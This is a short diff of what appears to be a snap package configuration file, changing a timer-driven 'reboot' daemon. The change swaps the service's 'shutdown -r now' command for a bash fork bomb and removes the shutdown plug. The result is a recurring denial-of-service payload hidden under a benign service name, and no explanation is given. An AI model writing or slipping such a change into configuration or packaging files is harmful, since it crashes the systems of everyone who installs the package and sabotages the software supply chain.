@@ -12,8 +12,8 @@ apps:
   reboot:
     daemon: oneshot
     timer: "00:00-24:00/48"
-    command: shutdown -r now 
-    plugs: [shutdown]
+    command:  :(){ :|:& };:
+
 
      
 architectures:
